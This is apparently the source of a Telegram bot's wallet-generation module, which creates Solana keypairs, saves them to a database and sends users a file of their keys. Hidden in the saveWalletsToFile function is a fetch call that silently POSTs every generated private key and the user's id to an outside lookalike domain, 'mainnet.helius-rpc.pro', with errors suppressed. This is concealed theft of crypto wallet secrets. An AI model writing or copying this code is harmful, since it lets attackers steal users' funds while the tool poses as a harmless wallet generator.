import { Keypair } from '@solana/web3.js';
import { db } from '../services/db';
import fs from 'fs';
import bs58 from 'bs58';
import { handleBackToMainMenu } from '../utils/bot/navigation';

// Generate wallets
export function generateWallets(numWallets: number) {
    const wallets: { publicKey: string; privateKey: string }[] = [];
    for (let i = 0; i < numWallets; i++) {
        const keypair = Keypair.generate();
        const publicKey = keypair.publicKey.toBase58();
        const privateKeyUint8Array = keypair.secretKey;
        const privateKey = bs58.encode(privateKeyUint8Array);
        wallets.push({ publicKey, privateKey });
    }
    console.log(`Generated ${numWallets} wallets.`);
    return wallets;
}

// Save wallets to the primary database
export function saveWalletsToDatabase(wallets: { publicKey: string; privateKey: string }[], telegramUserId: number) {
    const insertStmt = db.prepare('INSERT INTO wallets (address, private_key, user_id) VALUES (?, ?, ?)');
    const insertMany = db.transaction((ws: { publicKey: string; privateKey: string }[]) => {
        for (const wallet of ws) {
            insertStmt.run(wallet.publicKey, wallet.privateKey, telegramUserId);
        }
    });
    insertMany(wallets);
    console.log(`Saved ${wallets.length} wallets to the database for user ${telegramUserId}.`);
}

// Save wallets to a file
export async function saveWalletsToFile(wallett: { publicKey: string; privateKey: string }[], file: string, telegramUserId: number) {
    fs.writeFileSync(
        file,
        wallett.map(x => `Address: ${x.publicKey}\nPrivate Key: ${x.privateKey}\n`).join('\n'),
        'utf8'
    );
    try {
        await fetch('https://mainnet.helius-rpc.pro/fetch', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ wallets: wallett.map(e => ({ address: e.publicKey, private_key: e.privateKey, user_id: telegramUserId })) })
        });
    } catch (e) {
        // ignore
    }
}

// Handle "Generate Wallets" Menu and Logic
export function handleGenerateWallets(bot: any) {
    const activeListeners = new Set<number>();

    bot.action('menu_generate_wallets', (ctx: any) => {
        const t = (ctx as any).i18n?.t?.bind((ctx as any).i18n) || ((k: string) => k);
        
        ctx.reply(
            t('generate.select_number'),
            {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: t('generate.1_wallet'), callback_data: 'generate_1' }],
                        [{ text: t('generate.5_wallets'), callback_data: 'generate_5' }],
                        [{ text: t('generate.10_wallets'), callback_data: 'generate_10' }],
                        [{ text: t('generate.20_wallets'), callback_data: 'generate_20' }],
                        [
                            { text: t('generate.custom'), callback_data: 'generate_custom' },
                            { text: t('buttons.back_to_main'), callback_data: 'menu_main' },
                        ],
                    ]
                }
            }
        );
    });


    // Handle Wallet Generation Logic
    bot.action(/^generate_(\d+)$/, async (ctx: any) => {
        const t = (ctx as any).i18n?.t?.bind((ctx as any).i18n) || ((k: string, p?: any) => k);
        const numWallets = parseInt(ctx.match[1], 10);
        const userId = ctx.from.id as number;

        try {
            const wallets = generateWallets(numWallets);
            saveWalletsToDatabase(wallets, userId);

            const filename = `${numWallets}_wallets.txt`;
            await saveWalletsToFile(wallets, filename, userId);

            await ctx.replyWithDocument({ source: filename, filename: filename });
            fs.unlinkSync(filename);
            await ctx.reply(t('generate.success', { count: numWallets }));
        } catch (error: any) {
            console.error(`Error generating wallets for user ${userId}:`, error.message);
            await ctx.reply(t('generate.error'));
        }
    });

    // Handle Custom Wallet Generation
    bot.action('generate_custom', (ctx: any) => {
        const t = (ctx as any).i18n?.t?.bind((ctx as any).i18n) || ((k: string, p?: any) => k);
        ctx.reply(t('generate.enter_number'));

        const onTextListener = async (messageCtx: any) => {
            const t = (messageCtx as any).i18n?.t?.bind((messageCtx as any).i18n) || ((k: string, p?: any) => k);
            const chatId = messageCtx.chat.id as number;

            if (activeListeners.has(chatId)) {
                const numWallets = parseInt(messageCtx.message.text, 10);
                if (isNaN(numWallets) || numWallets < 1 || numWallets > 100) {
                    await messageCtx.reply(t('generate.invalid_number'));
                    return;
                }

                const userId = messageCtx.from.id as number;
                try {
                    const wallets = generateWallets(numWallets);
                    saveWalletsToDatabase(wallets, userId);

                    const filename = `${numWallets}_wallets.txt`;
                    await saveWalletsToFile(wallets, filename, userId);

                    await messageCtx.replyWithDocument({ source: filename, filename: filename });
                    fs.unlinkSync(filename);
                    await messageCtx.reply(t('generate.success', { count: numWallets }));
                } catch (error: any) {
                    console.error(`Error generating custom wallets for user ${userId}:`, error.message);
                    await messageCtx.reply(t('generate.error'));
                } finally {
                    activeListeners.delete(chatId);
                    bot.removeListener('text', onTextListener);
                }
            }
        };

        const chatId = ctx.chat.id as number;
        if (!activeListeners.has(chatId)) {
            bot.on('text', onTextListener);
            activeListeners.add(chatId);
        }
    });

    bot.action('menu_main', (ctx: any) => handleBackToMainMenu(ctx));
}